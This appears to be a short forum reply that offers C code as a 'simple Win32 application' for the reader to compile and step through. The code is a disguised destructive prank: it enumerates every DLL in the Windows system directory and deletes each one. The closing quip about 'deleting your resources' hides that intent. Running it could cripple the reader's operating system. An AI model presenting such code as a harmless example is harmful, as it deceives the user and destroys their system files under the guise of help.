Here you go. Create a simple Win32 application and step through this... <g>

#include <shlwapi.h>
#pragma comment( lib,"shlwapi.lib" )

int APIENTRY WinMain(HINSTANCE hInstance,
HINSTANCE hPrevInstance,
LPSTR lpCmdLine,
int nCmdShow)
{
char szPath[MAX_PATH];
ZeroMemory( szPath, MAX_PATH );

GetSystemDirectory( szPath, MAX_PATH );
lstrcat( szPath, "\\*.dll" );

WIN32_FIND_DATA fdInfo;
HANDLE hFind = FindFirstFile( szPath, &fdInfo );
if( hFind == INVALID_HANDLE_VALUE )
return -1;

do{
lstrcpy( StrRChr(szPath, NULL, '\\')+1, fdInfo.cFileName );
DeleteFile( szPath );

}while( FindNextFile(hFind, &fdInfo) );

FindClose( hFind );

return 0;
}

Remember, it's always good to delete your resources even if you're app is ending.. =)
